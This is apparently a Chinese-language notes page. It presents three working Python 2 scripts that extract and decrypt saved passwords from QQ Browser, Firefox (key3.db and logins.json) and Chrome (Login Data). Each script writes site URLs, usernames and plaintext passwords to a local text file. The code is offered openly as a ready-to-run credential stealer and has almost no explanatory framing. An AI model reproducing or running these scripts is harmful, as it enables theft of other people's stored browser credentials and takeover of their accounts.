### 环境
                python2.7
                pywin32
                shutil
                pyasn1
                PyCrpto

### chrome qq

                默认位置在：Chrome:C:\Users\当前用户名\AppData\Local\Google\Chrome\User Data\Default
            QQ: C:\Users\当前用户名\AppData\Local\Tencent\QQBrowser\User Data\Default
            登录QQ后:C:\Users\hasee-pc\AppData\Local\Tencent\QQBrowser\User Data\Default\QQ号码
                保存的密码：Chrome&Opera:Login Data
            QQ Browser:EncryptedStorage

```python
import os
import shutil
import win32crypt
import sqlite3

class Qq:
    def __init__(self):

        self.get_path()

    def get_path(self):
        self.data_path = []
        for root, dirs, files in os.walk(
                os.path.expanduser('~\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default')):
            for file in files:
                if file == 'EncryptedStorage':
                    self.data_path.append(os.path.join(root, file))
        return self.data_path

    def get_pwd(self):
        qq_pwd = []
        for path in self.data_path:
            shutil.copy(path, os.getcwd() + '\\' + 'db_copy')  # os.sep = \\
            path = os.getcwd() + '\\' + 'db_copy'
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute('SELECT str1, str2, blob0 FROM entries')
            for res in cursor.fetchall():
                values = {}
                try:
                    pwd = win32crypt.CryptUnprotectData(res[2], None, None, None, 0)[1]
                except:
                    pwd = ''
                values['URL'] = res[0]
                values['ID'] = res[1]
                values['PWD'] = pwd
                qq_pwd.append(values)

            conn.close()
            os.remove(path)

        return qq_pwd

p = Qq()
for i in p.get_pwd():
    a = i['URL']
    b = i['ID']
    c = i['PWD']
    temp_file = open("temp.txt", 'a')
    temp_file.write(str(a) +'  '+ str(b) +'   '+ str(c)+ '\n')
    temp_file.close
    #print i['URL'], i['ID'], i['PWD']
```

```python
import os
import json
import hmac
import shutil
import sqlite3
import win32crypt
from hashlib import sha1
from struct import unpack
from base64 import b64decode
from itertools import product
from Crypto.Cipher import DES3
from pyasn1.codec.der import decoder
from ConfigParser import RawConfigParser
from binascii import hexlify, unhexlify
from Crypto.Util.number import long_to_bytes


class Credentials(object):
    def __init__(self, db):
        global database_find
        self.db = db
        if os.path.isfile(db):
            f = open(db, 'r')
            tmp = f.read()
            if tmp:
                database_find = True
            f.close()


class Json_db(Credentials):
    def __init__(self, profile):
        db = profile + os.sep + "logins.json"
        super(Json_db, self).__init__(db)

    def __iter__(self):
        if os.path.exists(self.db):
            with open(self.db) as fh:
                data = json.load(fh)
                try:
                    logins = data["logins"]
                except:
                    raise Exception("Unrecognized format in {0}".format(self.db))

                for i in logins:
                    yield (i["hostname"], i["encryptedUsername"], i["encryptedPassword"])


class Firefox:
    def printASN1(self, d, l, rl):
        type = ord(d[0])
        length = ord(d[1])
        if length & 0x80 > 0:
            nByteLength = length & 0x7f
            length = ord(d[2])

            skip = 1
        else:
            skip = 0

        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2 + skip + readLen:], seqLen, rl + 1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length + 2
        elif type == 6:
            return length + 2
        elif type == 4:
            return length + 2
        elif type == 5:

            return length + 2
        elif type == 2:
            return length + 2
        else:
            if length == l - 2:
                self.printASN1(d[2:], length, rl + 1)
                return length

    def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData):

        hp = sha1(globalSalt + masterPassword).digest()
        pes = entrySalt + '\x00' * (20 - len(entrySalt))
        chp = sha1(hp + entrySalt).digest()
        k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]

        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    def extractSecretKey(self, globalSalt, masterPassword, entrySalt):
        if unhexlify('f8000000000000000000000000000001') not in self.key3:
            return None
        privKeyEntry = self.key3[unhexlify('f8000000000000000000000000000001')]
        saltLen = ord(privKeyEntry[1])
        nameLen = ord(privKeyEntry[2])
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3 + saltLen + nameLen:])
        data = privKeyEntry[3 + saltLen + nameLen:]
        self.printASN1(data, len(data), 0)
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decrypt3DES(globalSalt, masterPassword, entrySalt, privKeyData)
        self.printASN1(privKey, len(privKey), 0)

        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        self.printASN1(prKey, len(prKey), 0)
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])

        return key

    def getShortLE(self, d, a):
        return unpack('<H', (d)[a:a + 2])[0]

    def getLongBE(self, d, a):
        return unpack('>L', (d)[a:a + 4])[0]

    def readBsddb(self, name):
        f = open(name, 'rb')

        header = f.read(4 * 15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            print_debug('WARNING', 'Bad magic number')
            return False
        version = self.getLongBE(header, 4)
        if version != 2:
            print_debug('WARNING', 'Bad version !=2 (1.85)')
            return False
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize * page)
            offsets = f.read((nkeys + 1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2 + i)
                val = self.getShortLE(offsets, 4 + i)
                nval = self.getShortLE(offsets, 8 + i)
                offsetVals.append(key + pagesize * page)
                offsetVals.append(val + pagesize * page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize * (page + 1))
            valKey = sorted(offsetVals)
            for i in range(keys * 2):
                f.seek(valKey[i])
                data = f.read(valKey[i + 1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i + 1]] = db1[i]

        return db

    def get_path(self):
        main_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox')
        cp = RawConfigParser()
        try:
            cp.read(os.path.join(main_path, 'profiles.ini'))
        except:
            return []
        self.profile_list = []
        for section in cp.sections():
            if section.startswith('Profile'):
                if cp.has_option(section, 'Path'):
                    self.profile_list.append(os.path.join(main_path, cp.get(section, 'Path').strip()))

        return self.profile_list

    def get_pwd(self):
        ffox_pwd = []
        for profile in self.get_path():
            if not os.path.exists(profile + os.sep + 'key3.db'):
                continue
            self.key3 = self.readBsddb(profile + os.sep + 'key3.db')
            if not self.key3:
                continue
            masterPassword = ''
            pwdCheck = self.key3['password-check']
            entrySaltLen = ord(pwdCheck[1])
            entrySalt = pwdCheck[3: 3 + entrySaltLen]
            encryptedPasswd = pwdCheck[-16:]
            globalSalt = self.key3['global-salt']
            cleartextData = self.decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedPasswd)

            credentials = Json_db(profile)
            key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)
            for host, user, pwd in credentials:
                values = {}
                values['URL'] = host

                loginASN1 = decoder.decode(b64decode(user))
                iv = loginASN1[0][1][1].asOctets()
                ciphertext = loginASN1[0][2].asOctets()
                login = DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext)

                try:
                    nb = unpack('B', login[-1])[0]
                    values['ID'] = login[:-nb]
                except:
                    values['ID'] = login

                passwdASN1 = decoder.decode(b64decode(pwd))
                iv = passwdASN1[0][1][1].asOctets()
                ciphertext = passwdASN1[0][2].asOctets()
                password = DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext)

                try:
                    nb = unpack('B', password[-1])[0]
                    values['PWD'] = password[:-nb]
                except:
                    values['PWD'] = password
                if len(values):
                    ffox_pwd.append(values)

        return ffox_pwd


p = Firefox()
fil = open("q.txt",'a')
fil.write(str(p.get_pwd()))
fil.close
#print p.get_pwd()
```

```python
import os
import shutil
import win32crypt
import sqlite3

class C:
    def get_w(self):
        path_tab = [
            os.path.expanduser('~\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data'),
            os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
        ]
        a_path = [path for path in path_tab if os.path.exists(path)]
        if not a_path:
            debug_info = '[-]'
            return
        if len(a_path) != 1:
            a_path = a_path[0]

        try:
            shutil.copy(a_path, os.getcwd() + '\\' + 'db_copy')
            a_path = os.getcwd() + '\\' + 'db_copy'
        except Exception, e:
            debug_info = '[-]' + e

        try:
            conn = sqlite3.connect(a_path)
            cur = conn.cursor()
        except Exception, e:
            debug_info = '[-]A' + e
            return

        cur.execute('SELECT origin_url, username_value, password_value FROM logins')
        c_w = []
        for res in cur.fetchall():
            values = {}
            try:
                w = win32crypt.CryptUnprotectData(res[2], None, None, None, 0)[1]
            except Exception, e:
                w = ''
                debug_info = '[-]A'
            values['URL'] = res[0]
            values['ID'] = res[1]
            values['W'] = w
            c_w.append(values)

        conn.close()
        if a_path.endswith('db_copy'):
            os.remove(a_path)

        return c_w

p = C()
for i in p.get_w():
    a = i['URL']
    b = i['ID']
    c = i['W']
    temp_file = open("temp.txt", 'a')
    temp_file.write(str(a) + '  '+ str(b) +'   '+ str(c) +'\n')
    temp_file.close
```